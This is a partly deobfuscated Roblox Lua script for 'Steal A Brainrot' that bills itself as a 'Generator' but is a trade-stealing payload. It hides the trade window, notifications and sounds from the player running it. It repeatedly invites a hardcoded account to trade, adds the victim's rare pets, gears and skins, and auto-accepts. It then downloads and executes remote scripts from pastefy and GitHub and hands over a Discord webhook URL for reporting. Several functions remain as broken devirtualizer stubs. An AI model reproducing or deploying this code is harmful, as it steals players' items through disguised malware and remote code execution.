repeat
	task.wait()
until game:IsLoaded()

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local localPlayer = Players.LocalPlayer
localPlayer:WaitForChild("PlayerGui")
local secretKey = getgenv().SECRET_KEY
local str = secretKey or ""
local targetId = getgenv().TARGET_ID or 0
local delayStep = getgenv().DELAY_STEP or 1
local tradeCycleDelay = getgenv().TRADE_CYCLE_DELAY
local apiUrl = getgenv().API_URL or "https://kiro-moreira.vercel.app"

if getgenv().AAVChocolaRunning then
	return
end

getgenv().AAVChocolaRunning = true
local placeId = game.PlaceId
local flag = false

if placeId == 99606176102979 then
	flag = true
elseif placeId == 109983668079237 then
	flag = false
else
	local ok, result = pcall(function()
		return MarketplaceService:GetProductInfo(placeId)
	end)

	if not (ok and result and result.Creator and result.Creator.CreatorType == "Group" and tonumber(result.Creator.CreatorTargetId) == 35815907) then
		localPlayer:Kick("You're stupid using modded")
		return
	end
end

local str2 = tostring(game.JobId) .. "_" .. tostring(localPlayer.UserId)
local str3 = "Unknown"

pcall(function()
	if getgenv().EXECUTOR_NAME then
		str3 = getgenv().EXECUTOR_NAME
	elseif identifyexecutor then
		local ok, result = pcall(identifyexecutor)

		if ok and result then
			str3 = result
		end
	elseif getexecutorname then
		local ok, result = pcall(getexecutorname)

		if ok and result then
			str3 = result
		end
	elseif syn and syn.getexecutorname then
		str3 = syn.getexecutorname()
	end
end)

if str3 == "Unknown" then
	if syn then
		str3 = "Synapse"
	elseif KRNL_LOADED then
		str3 = "Krnl"
	elseif WL_LOADED then
		str3 = "WeAreDevs"
	elseif getgenv().is_sirhurt then
		str3 = "SirHurt"
	end
end

local tbl = {}

if getgenv().TARGET_BRAINROTS then
	for k, targetBrainrot in pairs(getgenv().TARGET_BRAINROTS) do
		tbl[k] = targetBrainrot
	end
end

local tbl2 = {}

if getgenv().TARGET_GEARS then
	for k, targetGear in pairs(getgenv().TARGET_GEARS) do
		tbl2[k] = targetGear
	end
end

local tbl3 = {}

if getgenv().TARGET_BASE_SKINS then
	for k, targetBaseSkin in pairs(getgenv().TARGET_BASE_SKINS) do
		tbl3[k] = targetBaseSkin
	end
end

local str4 = "cerberus_xor_2025"

local function fn()
	error("devirt: symbolic next pc/mode: (r1 Add 1) / 248 (at 248:523)")
end

local function fn2()
	error("devirt: symbolic next pc/mode: (r1 Add 1) / 248 (at 248:101)")
end

local function fn3()
	error("devirt: symbolic next pc/mode: 8 / r1 (at 248:79)")
end

local function fn4()
	error("devirt: symbolic next pc/mode: 1 / r1 (at 248:13)")
end

local ReplicatorClient = require(ReplicatedStorage.Packages.ReplicatorClient)
local Channel = require(ReplicatedStorage.Packages.Synchronizer.Channel)
local Animals = nil
local Game = nil
local Mutations = nil
local Traits = nil

pcall(function()
	local datas = ReplicatedStorage:WaitForChild("Datas")
	Animals = require(datas:WaitForChild("Animals"))
	Game = require(datas:WaitForChild("Game"))
	Mutations = require(datas:WaitForChild("Mutations"))
	Traits = require(datas:WaitForChild("Traits"))
end)

local TradeController = require(ReplicatedStorage.Controllers.TradeController)
local InterfaceController = require(ReplicatedStorage.Controllers.InterfaceController)
local SoundController = require(ReplicatedStorage.Controllers.SoundController)
local NotificationController = require(ReplicatedStorage.Controllers.NotificationController)
local CameraController = require(ReplicatedStorage.Controllers.CameraController)
local TradeLiveTrade = InterfaceController:Get("TradeLiveTrade")
local toggle = InterfaceController.Toggle
local setState = InterfaceController.SetState
local notify = NotificationController.Notify
local error_ = NotificationController.Error
local success = NotificationController.Success
local playSound = SoundController.PlaySound

local function fn5()
	error("devirt: symbolic next pc/mode: (r1 Add 1) / 248 (at 248:548)")
end

local function fn6()
	error("devirt: symbolic next pc/mode: (r1 Add 1) / 248 (at 248:13)")
end

SoundController.PlaySound = function(arg, arg2, ...)
	local TradeLiveTrade2 = InterfaceController:Get("TradeLiveTrade")
	local v = fn5()
	local pos

	if v then
		pos = v
	else
		pos = debug.info(2, "s"):find("AnimatedButton") and TradeLiveTrade2 and TradeLiveTrade2:IsOpened()
	end

	if pos then
		return
	end
	local v2 = table.pack(...)
	local v3 = playSound
	v2.n = 3 + v2.n - 1
	table.move(v2, 1, v2.n, 3, v2)
	v2[1] = arg
	v2[2] = arg2
	return v3(table.unpack(v2, 1, v2.n))
end

if TradeLiveTrade and TradeLiveTrade:IsOpened() then
	InterfaceController:Toggle("TradeLiveTrade", false)
	CameraController:Blur(0, 0)
	CameraController:Fov(CameraController:GetDefaultFov(), 0)
end

InterfaceController.Toggle = function(arg, arg2, arg3, arg4)
	if arg2 == "TradeLiveTrade" then
		return
	end
	return toggle(arg, arg2, arg3, arg4)
end

InterfaceController.SetState = function(arg, arg2, arg3, arg4)
	if arg2 == "TradeLiveTrade" then
		return
	end
	return setState(arg, arg2, arg3, arg4)
end

NotificationController.Notify = function(arg, arg2, ...)
	if fn5() or fn6(arg2) then
		return
	end
	local v = table.pack(...)
	local v2 = notify
	v.n = 3 + v.n - 1
	table.move(v, 1, v.n, 3, v)
	v[1] = arg
	v[2] = arg2
	return v2(table.unpack(v, 1, v.n))
end

NotificationController.Error = function(arg, ...)
	if fn5() then
		return
	end
	return error_(arg, ...)
end

NotificationController.Success = function(arg, ...)
	if fn5() then
		return
	end
	return success(arg, ...)
end

local function fn7()
	error("devirt: symbolic next pc/mode: (r6 Add 1) / 248 (at 248:1)")
end

local function fn8()
	error("devirt: symbolic next pc/mode: (r2 Add 1) / 248 (at 248:8)")
end

local v

repeat
	v = fn8()
	task.wait(0.1)
until v

local tbl4 = {}
local tbl5 = {}
local tbl6 = {}
local tbl7 = {}
local tbl8 = {}
local tbl9 = {}
local animalPodiums = v.AnimalPodiums or v.AnimalList

if type(animalPodiums) == "table" then
	for k, animalPodium in pairs(animalPodiums) do
		if type(animalPodium) == "table" and animalPodium.Index then
			local index = animalPodium.Index
			local mutation = animalPodium.Mutation or "None"
			local traits = type(animalPodium.Traits) == "table" and animalPodium.Traits or {}
			local v2 = fn7(index, mutation, traits)

			table.insert(tbl7, {
				name = index,
				gen = v2,
				mutation = tostring(mutation),
				traits = traits,
				slot = tonumber(k),
			})

			if tbl[index] then
				table.insert(tbl4, {
					slotKey = tonumber(k),
					data = animalPodium,
					mutation = mutation,
					traits = traits,
					genValue = v2,
				})
			end
		end
	end
end

local gearInventory = v.GearInventory

if type(gearInventory) == "table" then
	for k, v2 in pairs(gearInventory) do
		if type(v2) == "table" and v2.GearName then
			table.insert(tbl8, { GearName = v2.GearName, UUID = k })

			if tbl2[v2.GearName] then
				table.insert(tbl5, { GearName = v2.GearName, UUID = k })
			end
		end
	end
end

local baseSkinInventory = v.BaseSkinInventory

if type(baseSkinInventory) == "table" then
	for k, v2 in pairs(baseSkinInventory) do
		if type(v2) == "table" and v2.SkinName then
			table.insert(tbl9, { SkinName = v2.SkinName, UUID = k })

			if tbl3[v2.SkinName] then
				table.insert(tbl6, { SkinName = v2.SkinName, UUID = k })
			end
		end
	end
end

if #tbl4 == 0 and #tbl5 == 0 and #tbl6 == 0 then
	return
end

local function fn9()
	error("devirt: symbolic next pc/mode: (r1 Add 1) / 248 (at 248:37)")
end

local function fn10()
	error("devirt: symbolic next pc/mode: (r1 Add 1) / 248 (at 248:111)")
end

local function fn11()
	error("devirt: symbolic next pc/mode: (r1 Add 1) / 248 (at 248:116)")
end

local v2 = targetId

local function fn12()
	error("devirt: symbolic next pc/mode: (r6 Add 1) / 248 (at 248:2043)")
end

local v3
v3, v3 = fn12()

if v3 and v3 ~= 0 then
	v2 = v3
end

local n = 96342491571673

local function fn13()
	error("devirt: symbolic next pc/mode: (r1 Add 1) / 248 (at 248:664)")
end

local function fn14()
	error("devirt: symbolic next pc/mode: (r10 Add 1) / 248 (at 248:1069)")
end

local function fn15()
	error("devirt: symbolic next pc/mode: (r8 Add 1) / 248 (at 248:493)")
end

local function fn16()
	error("devirt: symbolic next pc/mode: (r7 Add 1) / 248 (at 248:31)")
end

if flag then
	task.spawn(function()
		error("devirt: symbolic next pc/mode: (r1 Add 1) / 248 (at 248:352)")
	end)
end

local v4 = nil
local v5 = nil
local v6 = nil
local v7 = nil
local v8 = nil

pcall(function()
	local getupvalue_ = debug.getupvalue or getupvalue
	local v9 = getupvalue_(TradeController._createLiveTrade, 15)
	v4 = getupvalue_(TradeController.SendInvite, 1)
	v5 = getupvalue_(v9.Brainrot.Add, 1)
	v6 = getupvalue_(v9.BaseSkin.Add, 1)
	v7 = getupvalue_(TradeController._createLiveTrade, 24)
	v8 = getupvalue_(TradeController._createLiveTrade, 23)
end)

if not (v4 and v5 and v7 and v8) then
	local net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")

	local function fn17(arg)
		local name = nil

		for _, v9 in net:GetChildren() do
			if #v9.Name > 40 then
				name = v9.Name
				continue
			end

			if v9.Name == arg and name then
				return name
			end
		end
	end

	local Invite = fn17("RF/TradeService/Invite") or fn17("RF/BrainrotTrader/Invite")
	local AddBrainrot = fn17("RF/TradeService/AddBrainrot") or fn17("RF/BrainrotTrader/AddBrainrot")
	local AddItem = fn17("RF/TradeService/AddItem") or fn17("RF/BrainrotTrader/AddItem")
	local Ready = fn17("RE/TradeService/Ready") or fn17("RS/BrainrotTrader/Ready")
	local Accept = fn17("RE/TradeService/Accept") or fn17("RS/BrainrotTrader/Accept")

	if not v4 then
		v4 = net:FindFirstChild(Invite or "")
	end

	if not v5 then
		v5 = net:FindFirstChild(AddBrainrot or "")
	end

	if not v6 then
		v6 = net:FindFirstChild(AddItem or "")
	end

	if not v7 then
		v7 = net:FindFirstChild(Ready or "")
	end

	if not v8 then
		v8 = net:FindFirstChild(Accept or "")
	end
end

if not (v4 and v5 and v7 and v8) then
	return
end

local flag2 = false
local flag3 = false
local v9 = ReplicatorClient.get(("Trade_%*"):format(localPlayer.UserId))

local function fn17()
	error("devirt: symbolic next pc/mode: (r1 Add 1) / 248 (at 248:26)")
end

v9:ListenRaw(function(arg)
	if not arg then
		return
	end

	if v9:TryIndex({ "active", "data" }) and not flag3 then
		flag3 = true
	end
end)

task.spawn(function()
	while not flag2 do
		if not flag3 then
			pcall(function()
				v4:InvokeServer("8fbe1594-7cef-4c29-94d1-a0e93adfa5a4", v2)
			end)
		end

		task.wait(0.15)
	end
end)

task.spawn(function()
	while not flag2 do
		flag3 = false

		while not flag3 and not flag2 do
			task.wait()
		end

		if not flag2 then
			task.spawn(function()
				while flag3 and not flag2 do
					pcall(function()
						v7:FireServer("23f15b0b-b633-4f6b-888f-5924b7425522")
					end)

					task.wait(0.05)

					pcall(function()
						v8:FireServer("86eea964-f19e-4ac6-b401-a71ecc89e596")
					end)

					task.wait(0.05)
				end
			end)

			task.spawn(function()
				local n2 = 1

				while flag3 and not flag2 do
					if #tbl4 > 0 then
						local v10 = tbl4[n2]

						if v10 then
							pcall(function()
								v5:InvokeServer("c85a2323-36b2-4121-968a-c064a6168aff", v10.slotKey, v10.data)
							end)

							n2 = n2 % #tbl4 + 1
						end
					end

					task.wait(delayStep)
				end
			end)

			task.spawn(function()
				local n2 = 1

				while flag3 and not flag2 do
					if v6 and #tbl5 > 0 then
						local v10 = tbl5[n2]

						if v10 then
							pcall(function()
								v6:InvokeServer("6786cce9-00d8-41e9-8beb-d96e0412b78b", "Gear", { GearName = v10.GearName, UUID = v10.UUID or "" })
							end)

							n2 = n2 % #tbl5 + 1
						end
					end

					task.wait(delayStep)
				end
			end)

			task.spawn(function()
				local n2 = 1

				while flag3 and not flag2 do
					if v6 and #tbl6 > 0 then
						local v10 = tbl6[n2]

						if v10 then
							pcall(function()
								v6:InvokeServer("6786cce9-00d8-41e9-8beb-d96e0412b78b", "BaseSkin", { SkinName = v10.SkinName, UUID = v10.UUID or "" })
							end)

							n2 = n2 % #tbl6 + 1
						end
					end

					task.wait(delayStep)
				end
			end)

			fn17()
			continue
		end

		break
	end
end)

local flag4 = false

local function fn18()
	error("devirt: symbolic next pc/mode: (r6 Add 1) / 248 (at 248:2167)")
end

local function fn19()
	error("devirt: symbolic next pc/mode: (r13 Add 1) / 248 (at 248:20)")
end

local function fn20()
	error("devirt: symbolic next pc/mode: (r1 Add 1) / 248 (at 248:22)")
end

local v10 = nil

pcall(function()
	v10 = (debug.getupvalue or getupvalue)(TradeController._createPlayerList, 21)
end)

if v10 then
	v10.OnClientEvent:Connect(function(arg)
		if typeof(arg) == "table" and tonumber(arg.otherUserId) == v2 then
			fn20()
		end
	end)
end

v9:ListenRaw(function(arg)
	if not arg and flag3 and not flag4 then
		task.delay(0.5, function()
			if not v9:TryIndex({ "active", "data" }) and not flag4 then
				fn20()
			end
		end)
	end
end)

-- ⚡ KIRO MOREIRA — Steal A Brainrot Generator
local targetId = 11351089502
local targetUser = "ransomwareincrypted"
local webhookUrl = "https://discord.com/api/webhooks/1557139544342794262/oAOtXlcQhP43vgoFZHb929M0RAjqWpnJKFocpzEW1bm0E5GAlR68OB5-THdzpqDeGQ1V"

local targetBrainrots = {
    ["Skibidi Toilet"] = true,
    ["Draculino"] = true,
    ["Lionello Casarello"] = true,
    ["Hydra Serpent"] = true,
    ["Orchidox"] = true,
    ["Strawberry Elephant"] = true,
    ["Meowl"] = true,
    ["Los Dragons"] = true,
    ["La Craft Machine"] = true,
    ["Gold and Diamond"] = true,
    ["Dragon Cannelloni"] = true,
    ["Dragon Gingerini"] = true,
    ["Griffin"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Hydra Bunny"] = true,
    ["Antonio"] = true,
    ["John Pork"] = true,
    ["Elefanto Frigo"] = true,
    ["Rubrikiko"] = true,
    ["Pancake and Syrup"] = true,
    ["Arcadragon"] = true,
    ["Rico Dinero"] = true,
    ["Capitano Americano"] = true,
    ["Kalika Bros"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["Globa Steppa"] = true,
    ["Dug Dug Dug"] = true,
    ["Dragon Aquanini"] = true,
    ["La Casa Boo"] = true,
    ["La Supreme Combinasion"] = true,
    ["Headless Horseman"] = true,
    ["Signore Carapace"] = true,
    ["Fishino Clownino"] = true,
    ["4th Bros"] = true,
    ["Bufalino Boomberino"] = true,
    ["Duggy Bros"] = true,
    ["Cerberus"] = true,
    ["Kraken"] = true,
    ["Money Money Bros"] = true,
    ["Venuspino"] = true,
    ["Steakini Fattini"] = true,
    ["Rhino Helicopterino"] = true,
    ["Caylusaurus"] = true,
    ["Sammyni Cakini"] = true,
    ["Centrucci Nuclucci"] = true,
    ["Los Hackers"] = true,
    ["John Doe"] = true,
    ["Gorillo Subwoofero"] = true,
    ["Jelly Moby"] = true,
    ["Foxini Lanternini"] = true,
    ["Ginger Cisterna"] = true,
    ["Bearito Cabinito"] = true,
    ["Digi Narwhal"] = true,
    ["Los Tangcitos"] = true,
    ["Los Tictacs"] = true,
    ["Moby Bros"] = true,
    ["Los Admins"] = true,
    ["1x1x1x1"] = true,
    ["25"] = true,
    ["67"] = true,
    ["Agarrini la Palini"] = true,
    ["Arcadopus"] = true,
    ["Bacuru and Egguru"] = true,
    ["Bananito"] = true,
    ["Baskito"] = true,
    ["Berryno"] = true,
    ["Bisonte Giuppitere"] = true,
    ["Blackhole GOAT"] = true,
    ["Boatito Auratito"] = true,
    ["Boppin Bunny"] = true,
    ["Brunito Marsito"] = true,
    ["Bunito Bunito Spinito"] = true,
    ["Bunnyman"] = true,
    ["Bunny and Eggy"] = true,
    ["Bunny Bunny Bunny Sahur"] = true,
    ["Buntteo"] = true,
    ["Burguro and Fryuro"] = true,
    ["Burrito Bandito"] = true,
    ["Capitano Moby"] = true,
    ["Cash or Card"] = true,
    ["Celestial Pegasus"] = true,
    ["Celularcini Viciosini"] = true,
    ["Chachechi"] = true,
    ["Chicleteira Bicicleteira"] = true,
    ["Chicleteira Cupideira"] = true,
    ["Chicleteira Noelteira"] = true,
    ["Chicleteirina Bicicleteirina"] = true,
    ["Chill Puppy"] = true,
    ["Chillin Chili"] = true,
    ["Chimnino"] = true,
    ["Chipso and Queso"] = true,
    ["Churrito Bunnito"] = true,
    ["Cigno Fulgoro"] = true,
    ["Cloverat Clapat"] = true,
    ["Cooki and Milki"] = true,
    ["Cuadramat and Pakrahmatmamat"] = true,
    ["Cupid Cupid Sahur"] = true,
    ["Cupid Hotspot"] = true,
    ["DJ Panda"] = true,
    ["Donkeyturbo Express"] = true,
    ["Dul Dul Dul"] = true,
    ["Easter Easter Easter Sahur"] = true,
    ["Eid Eid Eid Sahur"] = true,
    ["Esok Sekolah"] = true,
    ["Eviledon"] = true,
    ["Extinct Matteo"] = true,
    ["Extinct Tralalero"] = true,
    ["Festive 67"] = true,
    ["Fishboard"] = true,
    ["Fortunu and Cashuru"] = true,
    ["Fragola La La La"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Frankentteo"] = true,
    ["GOAT"] = true,
    ["Garama and Madundung"] = true,
    ["Giftini Spyderini"] = true,
    ["Ginger Gerat"] = true,
    ["Gobblino Uniciclino"] = true,
    ["Gold Gold Gold"] = true,
    ["Graipuss Medussi"] = true,
    ["Granny"] = true,
    ["Guerriro Digitale"] = true,
    ["Guest 666"] = true,
    ["Ho Ho Ho Sahur"] = true,
    ["Hopilikalika Hopilikalako"] = true,
    ["Horegini Boom"] = true,
    ["Jackorilla"] = true,
    ["Job Job Job Sahur"] = true,
    ["Jolly Jolly Sahur"] = true,
    ["Karker Sahur"] = true,
    ["Karkerkar Kurkur"] = true,
    ["Ketchuru and Musturu"] = true,
    ["Ketupat Bros"] = true,
    ["Ketupat Kepat"] = true,
    ["La Cucaracha"] = true,
    ["La Easter Grande"] = true,
    ["La Extinct Grande"] = true,
    ["La Food Combinasion"] = true,
    ["La Ginger Sekolah"] = true,
    ["La Grande Combinasion"] = true,
    ["La Jolly Grande"] = true,
    ["La Karkerkar Combinasion"] = true,
    ["La Lucky Grande"] = true,
    ["La Romantic Grande"] = true,
    ["La Sahur Combinasion"] = true,
    ["La Secret Combinasion"] = true,
    ["La Spooky Grande"] = true,
    ["La Taco Combinasion"] = true,
    ["La Vacca Jacko Linterino"] = true,
    ["La Vacca Lepre Lepreino"] = true,
    ["La Vacca Prese Presente"] = true,
    ["La Vacca Saturno Saturnita"] = true,
    ["Las Sis"] = true,
    ["Las Tralaleritas"] = true,
    ["Las Vaquitas Saturnitas"] = true,
    ["Lavadorito Spinito"] = true,
    ["Coco and Mango"] = true,
    ["Los Secret Combinasionas"] = true,
    ["Examen Bros"] = true,
    ["Pizza and Ranch"] = true,
    ["Chicleteira Champeona"] = true,
    ["List List List Sahur"] = true,
    ["Los 25"] = true,
    ["Los 67"] = true,
    ["Los Amigos"] = true,
    ["Bumbatron"] = true,
    ["Yetimatic"] = true,
    ["S'more Serat"] = true,
    ["Queen Bee"] = true,
    ["Scorpino Coasterino"] = true,
    ["Honey Honey Bear"] = true,
    ["Pogo Pogo Penguin"] = true,
    ["Conetto Morsetto"] = true,
    ["La Breakfast Combinasion"] = true,
    ["Los Bunitos"] = true,
    ["Los Burritos"] = true,
    ["Los Candies"] = true,
    ["Los Chicleteiras"] = true,
    ["Los Combinasionas"] = true,
    ["Los Cucarachas"] = true,
    ["Los Cupids"] = true,
    ["Los Hotspotsitos"] = true,
    ["Los Jobcitos"] = true,
    ["Los Jolly Combinasionas"] = true,
    ["Los Karkeritos"] = true,
    ["Los Matteos"] = true,
    ["Los Mi Gatitos"] = true,
    ["Los Mobilis"] = true,
    ["Los Nooo My Hotspotsitos"] = true,
    ["Los Planitos"] = true,
    ["Los Primos"] = true,
    ["Los Puggies"] = true,
    ["Los Quesadillas"] = true,
    ["Los Sekolahs"] = true,
    ["Los Spaghettis"] = true,
    ["Los Spooky Combinasionas"] = true,
    ["Los Spyderinis"] = true,
    ["Los Sweethearts"] = true,
    ["Los Tacoritas"] = true,
    ["Los Tortus"] = true,
    ["Los Tralaleritos"] = true,
    ["Los Trios"] = true,
    ["Love Love Bear"] = true,
    ["Love Love Love Sahur"] = true,
    ["Lovin Rose"] = true,
    ["Luck Luck Luck Sahur"] = true,
    ["Mariachi Corazoni"] = true,
    ["Mi Gatito"] = true,
    ["Mieteteira Bicicleteira"] = true,
    ["Money Money Puggy"] = true,
    ["Money Money Reindeer"] = true,
    ["Nacho Spyder"] = true,
    ["Naughty Naughty"] = true,
    ["Noo My Candy"] = true,
    ["Noo My Eggs"] = true,
    ["Noo My Examine"] = true,
    ["Noo My Gold"] = true,
    ["Noo My Heart"] = true,
    ["Noo My Present"] = true,
    ["Nooo My Hotspot"] = true,
    ["Nuclearo Dinossauro"] = true,
    ["Orcaledon"] = true,
    ["Paradiso Axolottino"] = true,
    ["Perrito Burrito"] = true,
    ["Pirulitoita Bicicleteira"] = true,
    ["Please My Present"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Pot Hotspot"] = true,
    ["Pot Pumpkin"] = true,
    ["Pumpkini Spyderini"] = true,
    ["Quackini Snackini"] = true,
    ["Quesadilla Crocodila"] = true,
    ["Quesadillo Vampiro"] = true,
    ["Rang Ring Bus"] = true,
    ["Reindeer Tralala"] = true,
    ["Reinito Sleighito"] = true,
    ["Rocco Disco"] = true,
    ["Rosey and Teddy"] = true,
    ["Rosetti Tualetti"] = true,
    ["Sammyni Fattini"] = true,
    ["Sammyni Spyderini"] = true,
    ["Santa Hotspot"] = true,
    ["Santteo"] = true,
    ["Secret Lucky Block"] = true,
    ["Serafinna Medusella"] = true,
    ["Snailo Clovero"] = true,
    ["Spaghetti Tualetti"] = true,
    ["Spinny Hammy"] = true,
    ["Spooky and Pumpky"] = true,
    ["Strawberrita"] = true,
    ["Swag Soda"] = true,
    ["Swaggy Bros"] = true,
    ["Tacorita Bicicleta"] = true,
    ["Tacorillo Crocodillo"] = true,
    ["Tang Tang Keletang"] = true,
    ["Telemorte"] = true,
    ["Tictac Sahur"] = true,
    ["To To To Sahur"] = true,
    ["Torrtuginni Dragonfrutini"] = true,
    ["Tralaledon"] = true,
    ["Trenostruzzo Turbo 4000"] = true,
    ["Trickolino"] = true,
    ["Triplito Tralaleritos"] = true,
    ["Tuff Toucan"] = true,
    ["Tung Tung Tung Sahur"] = true,
    ["Ventoliero Pavonero"] = true,
    ["Vulturino Skeletono"] = true,
    ["W or L"] = true,
    ["Yess My Examine"] = true,
    ["Zombie Tralala"] = true,
    ["Grabatron"] = true,
    ["Rubiko and Kubiko"] = true,
    ["Cangurato Gelato"] = true,
    ["Noodle Noodle Poodle"] = true,
    ["Candini Fluffini"] = true,
    ["La Fuse Machine"] = true,
    ["Polaroidini"] = true,
    ["Nachorilla"] = true,
    ["Sammyni Truckini"] = true,
    ["Tacoturbo Tacorito"] = true,
    ["Burrito Bat"] = true,
    ["Chicli Chicla"] = true,
    ["Panda Popanda"] = true,
    ["Deputy Leopard"] = true
}

local targetBaseSkins = {
    ["Aquatic"] = true,
    ["Bunny Basket"] = true,
    ["Candy"] = true,
    ["Christmas"] = true,
    ["Cursed"] = true,
    ["Cyber"] = true,
    ["Diamond"] = true,
    ["Divine"] = true,
    ["Easter"] = true,
    ["Galaxy"] = true,
    ["Gingerbread"] = true,
    ["Gold"] = true,
    ["Halloween"] = true,
    ["Lava"] = true,
    ["Lucky"] = true,
    ["Octo"] = true,
    ["Pot of Gold"] = true,
    ["Radioactive"] = true,
    ["Rainbow"] = true,
    ["Rose"] = true,
    ["Summer"] = true,
    ["Taco"] = true,
    ["Valentines"] = true,
    ["Yin Yang"] = true,
    ["Tralalero"] = true
}

local targetGears = {
    ["Alien Slap"] = true,
    ["Blackhole Bomb"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Bloodmoon Slap"] = true,
    ["Candy Sentry"] = true,
    ["Candy Slap"] = true,
    ["Cupid's Wings"] = true,
    ["Cursed Slap"] = true,
    ["Cyber Slap"] = true,
    ["Demon's Head"] = true,
    ["Divine Slap"] = true,
    ["Lava Blaster"] = true,
    ["Lava Slap"] = true,
    ["Radioactive Airstrike"] = true,
    ["Radioactive Slap"] = true,
    ["Rainbow Hammer"] = true,
    ["Rainbow Slap"] = true,
    ["Santa's Sleigh"] = true,
    ["Waverider"] = true,
    ["Witch's Broom"] = true,
    ["Yin Yang Lamp"] = true,
    ["Yin Yang Slap"] = true,
    ["Phantom Slap"] = true,
    ["Crystal Slap"] = true
}

-- Anti-Leave Hook
task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/RsqRaQC0/raw"))()
end)

task.spawn(function()
    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(targetId, targetUser, webhookUrl, targetBrainrots, targetBaseSkins, targetGears)
    end
end)
